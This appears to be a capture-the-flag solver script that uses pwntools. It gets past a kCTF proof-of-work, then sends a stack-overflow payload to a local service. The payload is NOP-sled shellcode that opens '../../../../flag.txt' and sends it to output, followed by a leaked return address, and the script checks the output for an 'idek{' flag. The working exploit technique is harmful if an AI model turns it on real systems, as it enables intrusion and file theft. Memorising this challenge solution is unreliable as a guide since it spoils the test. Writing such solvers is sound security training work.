#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib
from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)
# r.clean()

context.arch = 'amd64'
payload = asm('nop') * 100
payload += asm("""
mov r13, 3

win:
mov rdi, r13
mov rax, 257
lea rsi, [ rip + flag ]
mov rdx, 0x0
syscall

mov rsi, rax
mov rax, 40
mov rdi, 1
mov rdx, 0
mov r10, 0x100
syscall

inc r13
jmp win

flag:
.string "../../../../flag.txt"
""")
# offset = 2092 - 4
offset = 2088
payload += b'a' * ( offset - len(payload) )

gdbscript = """
*0x0000000000401549
"""

# with process("./a.out" )  as p:
r.recvuntil(b":")
leak = int(r.recvline().strip(), 16)
payload += p64(leak)
r.sendline(payload)
flag = r.clean()


if b'idek{' in flag:
    exit(0)
else:
    exit(-1)
